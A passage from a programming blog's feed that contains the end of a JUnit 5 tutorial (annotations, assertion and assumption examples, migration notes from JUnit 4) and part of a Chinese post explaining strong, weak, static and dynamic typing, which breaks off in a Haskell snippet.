<em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@BeforeAll</code></td><td align="left">Denotes that the annotated method should be executed <em>before</em> <strong>all</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, and <code>@TestFactory</code> methods in the current class; analogous to JUnit 4’s <code>@BeforeClass</code>. Such methods are <em>inherited</em> (unless they are <em>hidden</em> or <em>overridden</em>) and must be <code>static</code> (unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used).</td></tr><tr><td align="left"><code>@AfterAll</code></td><td align="left">Denotes that the annotated method should be executed <em>after</em> <strong>all</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, and <code>@TestFactory</code> methods in the current class; analogous to JUnit 4’s <code>@AfterClass</code>. Such methods are <em>inherited</em> (unless they are <em>hidden</em> or <em>overridden</em>) and must be <code>static</code> (unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used).</td></tr><tr><td align="left"><code>@Nested</code></td><td align="left">Denotes that the annotated class is a non-static <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested">nested test class</a>. <code>@BeforeAll</code> and <code>@AfterAll</code> methods cannot be used directly in a <code>@Nested</code> test class unless the “per-class” <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> is used. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@Tag</code></td><td align="left">Used to declare <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-tagging-and-filtering">tags for filtering tests</a>, either at the class or method level; analogous to test groups in TestNG or Categories in JUnit 4. Such annotations are <em>inherited</em> at the class level but not at the method level.</td></tr><tr><td align="left"><code>@Disabled</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-disabling">disable</a> a test class or test method; analogous to JUnit 4’s <code>@Ignore</code>. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@Timeout</code></td><td align="left">Used to fail a test, test factory, test template, or lifecycle method if its execution exceeds a given duration. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@ExtendWith</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-registration-declarative">register extensions declaratively</a>. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@RegisterExtension</code></td><td align="left">Used to <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-registration-programmatic">register extensions programmatically</a> via fields. Such fields are <em>inherited</em> unless they are <em>shadowed</em>.</td></tr><tr><td align="left"><code>@TempDir</code></td><td align="left">Used to supply a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-built-in-extensions-TempDirectory">temporary directory</a> via field injection or parameter injection in a lifecycle method or test method; located in the <code>org.junit.jupiter.api.io</code> package.</td></tr></tbody></table><h2 id="Assertions-1"><a href="#Assertions-1" class="headerlink" title="Assertions"></a>Assertions</h2><p>JUnit Jupiter comes with many of the assertion methods that JUnit 4 has and adds a few that lend themselves well to being used with Java 8 lambdas. All JUnit Jupiter assertions are <code>static</code> methods in the <code>org.junit.jupiter.api.Assertions</code> class.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.time.Duration.ofMillis;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.time.Duration.ofMinutes;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertAll;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertEquals;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertNotNull;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertThrows;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTimeout;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertTrue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> example.domain.Person;</span><br><span class="line"><span class="keyword">import</span> example.util.Calculator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AssertionsDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Calculator calculator = <span class="keyword">new</span> Calculator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Person person = <span class="keyword">new</span> Person(<span class="string">&quot;Jane&quot;</span>, <span class="string">&quot;Doe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">standardAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assertEquals(<span class="number">2</span>, calculator.add(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        assertEquals(<span class="number">4</span>, calculator.multiply(<span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">                <span class="string">&quot;The optional failure message is now the last parameter&quot;</span>);</span><br><span class="line">        assertTrue(<span class="string">&#x27;a&#x27;</span> &lt; <span class="string">&#x27;b&#x27;</span>, () -&gt; <span class="string">&quot;Assertion messages can be lazily evaluated -- &quot;</span></span><br><span class="line">                + <span class="string">&quot;to avoid constructing complex messages unnecessarily.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">groupedAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// In a grouped assertion all assertions are executed, and all</span></span><br><span class="line">        <span class="comment">// failures will be reported together.</span></span><br><span class="line">        assertAll(<span class="string">&quot;person&quot;</span>,</span><br><span class="line">            () -&gt; assertEquals(<span class="string">&quot;Jane&quot;</span>, person.getFirstName()),</span><br><span class="line">            () -&gt; assertEquals(<span class="string">&quot;Doe&quot;</span>, person.getLastName())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dependentAssertions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Within a code block, if an assertion fails the</span></span><br><span class="line">        <span class="comment">// subsequent code in the same block will be skipped.</span></span><br><span class="line">        assertAll(<span class="string">&quot;properties&quot;</span>,</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                String firstName = person.getFirstName();</span><br><span class="line">                assertNotNull(firstName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Executed only if the previous assertion is valid.</span></span><br><span class="line">                assertAll(<span class="string">&quot;first name&quot;</span>,</span><br><span class="line">                    () -&gt; assertTrue(firstName.startsWith(<span class="string">&quot;J&quot;</span>)),</span><br><span class="line">                    () -&gt; assertTrue(firstName.endsWith(<span class="string">&quot;e&quot;</span>))</span><br><span class="line">                );</span><br><span class="line">            &#125;,</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                <span class="comment">// Grouped assertion, so processed independently</span></span><br><span class="line">                <span class="comment">// of results of first name assertions.</span></span><br><span class="line">                String lastName = person.getLastName();</span><br><span class="line">                assertNotNull(lastName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Executed only if the previous assertion is valid.</span></span><br><span class="line">                assertAll(<span class="string">&quot;last name&quot;</span>,</span><br><span class="line">                    () -&gt; assertTrue(lastName.startsWith(<span class="string">&quot;D&quot;</span>)),</span><br><span class="line">                    () -&gt; assertTrue(lastName.endsWith(<span class="string">&quot;e&quot;</span>))</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">exceptionTesting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Exception exception = assertThrows(ArithmeticException.class, () -&gt;</span><br><span class="line">            calculator.divide(<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        assertEquals(<span class="string">&quot;/ by zero&quot;</span>, exception.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutNotExceeded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion succeeds.</span></span><br><span class="line">        assertTimeout(ofMinutes(<span class="number">2</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Perform task that takes less than 2 minutes.</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutNotExceededWithResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion succeeds, and returns the supplied object.</span></span><br><span class="line">        String actualResult = assertTimeout(ofMinutes(<span class="number">2</span>), () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a result&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        assertEquals(<span class="string">&quot;a result&quot;</span>, actualResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutNotExceededWithMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion invokes a method reference and returns an object.</span></span><br><span class="line">        String actualGreeting = assertTimeout(ofMinutes(<span class="number">2</span>), AssertionsDemo::greeting);</span><br><span class="line">        assertEquals(<span class="string">&quot;Hello, World!&quot;</span>, actualGreeting);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutExceeded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion fails with an error message similar to:</span></span><br><span class="line">        <span class="comment">// execution exceeded timeout of 10 ms by 91 ms</span></span><br><span class="line">        assertTimeout(ofMillis(<span class="number">10</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Simulate task that takes more than 10 ms.</span></span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutExceededWithPreemptiveTermination</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion fails with an error message similar to:</span></span><br><span class="line">        <span class="comment">// execution timed out after 10 ms</span></span><br><span class="line">        assertTimeoutPreemptively(ofMillis(<span class="number">10</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Simulate task that takes more than 10 ms.</span></span><br><span class="line">            <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>).await();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">greeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertEquals;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assumptions.assumeTrue;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assumptions.assumingThat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> example.util.Calculator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AssumptionsDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Calculator calculator = <span class="keyword">new</span> Calculator();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testOnlyOnCiServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumeTrue(<span class="string">&quot;CI&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)));</span><br><span class="line">        <span class="comment">// remainder of test</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testOnlyOnDeveloperWorkstation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumeTrue(<span class="string">&quot;DEV&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)),</span><br><span class="line">            () -&gt; <span class="string">&quot;Aborting test: not on developer workstation&quot;</span>);</span><br><span class="line">        <span class="comment">// remainder of test</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testInAllEnvironments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumingThat(<span class="string">&quot;CI&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)),</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                <span class="comment">// perform these assertions only on the CI server</span></span><br><span class="line">                assertEquals(<span class="number">2</span>, calculator.divide(<span class="number">4</span>, <span class="number">2</span>));</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// perform these assertions in all environments</span></span><br><span class="line">        assertEquals(<span class="number">42</span>, calculator.multiply(<span class="number">6</span>, <span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Migrating-from-JUnit4"><a href="#Migrating-from-JUnit4" class="headerlink" title="Migrating from JUnit4"></a>Migrating from JUnit4</h2><ul><li>Annotations reside in the <code>org.junit.jupiter.api</code> package.</li><li>Assertions reside in <code>org.junit.jupiter.api.Assertions</code>.<ul><li>Note that you may continue to use assertion methods from <code>org.junit.Assert</code> or any other assertion library such as <a href="https://joel-costigliola.github.io/assertj/">AssertJ</a>, <a href="https://hamcrest.org/JavaHamcrest/">Hamcrest</a>, <a href="https://truth.dev/">Truth</a>, etc.</li></ul></li><li>Assumptions reside in <code>org.junit.jupiter.api.Assumptions</code>.<ul><li>Note that JUnit Jupiter 5.4 and later versions support methods from JUnit 4’s <code>org.junit.Assume</code> class for assumptions. Specifically, JUnit Jupiter supports JUnit 4’s <code>AssumptionViolatedException</code> to signal that a test should be aborted instead of marked as a failure.</li></ul></li><li><code>@Before</code> and <code>@After</code> no longer exist; use <code>@BeforeEach</code> and <code>@AfterEach</code> instead.</li><li><code>@BeforeClass</code> and <code>@AfterClass</code> no longer exist; use <code>@BeforeAll</code> and <code>@AfterAll</code> instead.</li><li><code>@Ignore</code> no longer exists: use <code>@Disabled</code> or one of the other built-in <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-conditional-execution">execution conditions</a> instead.</li><li><code>@Category</code> no longer exists; use <code>@Tag</code> instead.</li><li><code>@RunWith</code> no longer exists; superseded by <code>@ExtendWith</code>.</li><li><code>@Rule</code> and <code>@ClassRule</code> no longer exist; superseded by <code>@ExtendWith</code> and <code>@RegisterExtension</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/manual-of-JUnit/image-20210517194801837.png&quot; alt=&quot;image-20210517194801837&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>厘清概念：弱类型、强类型、动态类型、静态类型</title>
    <link href="https://www.fvolcano.red/2021/weak-strong-static-dynamic-langs/"/>
    <id>https://www.fvolcano.red/2021/weak-strong-static-dynamic-langs/</id>
    <published>2021-05-09T05:15:51.000Z</published>
    <updated>2021-05-09T05:15:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/weak-strong-static-dynamic-langs/b0aeb7ffd1667b9162e5329154d43777_r.jpg" alt="img"></p><a id="more"></a><h2 id="资料整理"><a href="#资料整理" class="headerlink" title="资料整理"></a>资料整理</h2><p><a href="https://www.zhihu.com/question/19918532">弱类型、强类型、动态类型、静态类型语言的区别是什么？</a></p><p><a href="https://segmentfault.com/a/1190000012372372">通俗的方式理解动态类型，静态类型；强类型，弱类型</a></p><p>正确性存疑，只是作为整理。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.zhihu.com/question/23434097">编程语言的类型系统为何如此重要？</a></li><li><a href="https://www.jianshu.com/p/336f19772046">编程语言傻傻分不清：弱类型、强类型、动态类型、静态类型</a></li></ol><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h3 id="Program-Errors"><a href="#Program-Errors" class="headerlink" title="Program Errors"></a>Program Errors</h3><ul><li><em>trapped errors</em>。导致程序终止执行，如除0，Java中数组越界访问</li><li><em>untrapped errors</em>。 出错后继续执行，但可能出现任意行为。如C里的缓冲区溢出、Jump到错误地址</li></ul><h3 id="Forbidden-Behaviours"><a href="#Forbidden-Behaviours" class="headerlink" title="Forbidden Behaviours"></a>Forbidden Behaviours</h3><p>语言设计时，可以定义一组<em>forbidden behaviors</em>. 它必须包括所有untrapped errors, 但可能包含trapped errors.</p><h3 id="well-behaved-amp-ill-behaved"><a href="#well-behaved-amp-ill-behaved" class="headerlink" title="well behaved &amp; ill behaved"></a>well behaved &amp; ill behaved</h3><p>如果程序执行不可能出现forbidden behaviors，则为well behaved，否则为ill behaved。</p><p><img src="/2021/weak-strong-static-dynamic-langs/1460000012372377" alt="img"></p><p>从图中可以看出，绿色的 program 表示所有程序（所有程序，你能想到和不能想到的），error 表示出错的程序，error 不仅仅包括 trapped error 和 untrapped error。</p><p>根据图我们可以严格的定义动态类型，静态类型；强类型，弱类型</p><ul><li>强类型：如果一门语言写出来的程序在红色矩形外部，则这门语言是强类型的，也就是上面说的 well behaved</li><li>弱类型：如果一门语言写出来的程序可能在红色矩形内部，则这门语言是弱类型的，也就是上面说的 ill behaved</li><li>静态类型：一门语言在<strong>编译</strong>时排除可能出现在红色矩形内的情况（通过语法报错），则这门语言是<strong>静态类型</strong>的</li><li>动态类型：一门语言在<strong>运行</strong>时排除可能出现在红色矩形内的情况（通过运行时报错，但如果是弱类型可能会触发 untrapped error，比如隐式转换，使得程序看起来似乎是正常运行的），则这门语言是<strong>动态类型</strong>的</li></ul><p>参考：《Type Systems》 Luca Cardelli - Microsoft Research</p><p><strong>Trapped error:</strong> An execution error that immediately results in a fault.</p><p><strong>Untrapped error:</strong> An execution error that does not immediately result in a fault.</p><p><strong>Forbidden error:</strong> The occurrence of one of a predetermined class of execution errors;</p><p>Typically the improper application of an operation to a value, such as not(3).</p><p><strong>Well behaved:</strong> A program fragment that will not produce forbidden errors at run time.</p><p><strong>Strongly checked language:</strong> A language where no forbidden errors can occur at run time (depending on the definition of forbidden error).</p><p><strong>Weakly checked language:</strong> A language that is statically checked but provides no clear guarantee of absence of execution errors.</p><p><strong>Statically checked language:</strong> A language where good behavior is determined before execution.</p><p><strong>Dynamically checked language:</strong> A language where good behavior is enforced during execution.</p><p><strong>Type safety:</strong> The property stating that programs do not cause untrapped errors.</p><p><strong>Explicitly typed language:</strong> A typed language where types are part of the syntax.</p><p><strong>Implicitly typed language:</strong> A typed language where types are not part of the syntax.</p><h1 id="强弱类型"><a href="#强弱类型" class="headerlink" title="强弱类型"></a>强弱类型</h1><ul><li><em>强类型strongly typed</em>: 如果一种语言的所有程序都是well behaved——即不可能出现forbidden behaviors，则该语言为strongly typed。</li><li><em>弱类型weakly typed</em>: 否则为weakly typed。比如C语言的缓冲区溢出，属于trapped errors，即属于forbidden behaviors..故C是弱类型</li></ul><p>弱类型语言，类型检查更不严格，如偏向于容忍隐式类型转换。譬如说C语言的int可以变成double。 这样的结果是：容易产生forbidden behaviours，所以是弱类型的。</p><p><strong>强类型定义语言（Explicit type conversion，强制数据类型定义语言，类型安全的语言）：</strong></p><p>一旦变量被指定某个数据类型，如果不经强制转换，即永远是此数据类型。</p><p>举例：若定义了一个整型变量a，若不进行显示转换，不能将a当作字符串类型处理<br>强类型语言是指需要进行变量/对象类型声明的语言，一般情况下需要编译执行。例如C/C++/Java/C#</p><p><strong>弱类型定义语言（Implicit type conversion，类型不安全的语言）：</strong></p><p>数据类型可以被忽略的语言。它与强类型定义语言相反, 一个变量可以赋不同数据类型的值。</p><p>举例：在VBScript中，可以将字符串 ‘12’ 和整数 3 进行连接得到字符串 ‘123’， 然后可以把它看成整数 123，而不需要显示转换<br>例如PHP/ASP/Ruby/Python/Perl/ABAP/SQL/JavaScript/Unix Shell等</p><p>注意：强类型定义语言在速度上可能略逊色于弱类型定义语言，但是强类型定义语言带来的严谨性能够有效的避免许多错误。</p><h1 id="动静态类型"><a href="#动静态类型" class="headerlink" title="动静态类型"></a>动静态类型</h1><p>静态类型、动态类型其实是指Type Check发生的时机。</p><ul><li><em>静态类型 statically</em>: 如果在编译时拒绝ill behaved程序，则是statically typed;</li><li><em>动态类型dynamiclly</em>: 如果在运行时拒绝ill behaviors, 则是dynamiclly typed。</li></ul><p>只通过是否将类型名显式地写出来，如int a; 并不能判断动静态类型。如Ocaml是静态隐式类型。</p><p>静态类型可以分为两种：</p><ul><li>如果类型是语言语法的一部分，在是<strong>explicitly typed显式类型；</strong></li><li>如果类型通过编译时推导，是<strong>implicity typed隐式类型</strong></li></ul><p><img src="/2021/weak-strong-static-dynamic-langs/ee19ac87e0b6adc9812c2e2cf77e7dc3_r.jpg" alt="img"></p><p><strong>动态类型语言（Dynamically Typed Language）：</strong></p><p>运行期间才做数据类型检查的语言，即动态类型语言编程时，永远不用给任何变量指定数据类型。该语言会在第一次赋值给变量时，在内部将数据类型记录下来。<br>例如：ECMAScript(JavaScript)、Ruby、Python、VBScript、php<br>Python和Ruby就是典型动态类型语言，其他各种脚本语言如VBScript也多少属于动态类型语言<br>优点：方便阅读，不需要写非常多的类型相关的代码；<br>缺点：不方便调试，命名不规范时会造成读不懂，不利于理解等</p><p><strong>静态类型语言（Statically Typed Language）：</strong></p><p>编译期间做检查数据类型的语言，即写程序时要声明所有变量的数据类型，是固定的。使用数据之前，必须先声明数据类型（int ,float,double等）。相当于使用之前，首先要为它们分配好内存空间。<br>例如：C/C++是静态类型语言的典型代表，其他的静态类型语言还有C#、JAVA等<br>优点：结构非常规范，便于调试，方便类型安全<br>缺点：为此需要写更多类型相关代码，不便于阅读、不清晰明了</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>弱类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">&quot;1&quot;</span>+<span class="number">2</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span></span><br></pre></td></tr></table></figure><p>强类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;1&quot;</span>+<span class="number">2</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: cannot concatenate <span class="string">&#x27;str&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;int&#x27;</span> objects</span><br></pre></td></tr></table></figure><p>动态类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line">&lt;type <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&quot;s&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line">&lt;type <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>静态类型：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; <span class="keyword">let</span> a = <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br><span class="line"></span><br><span 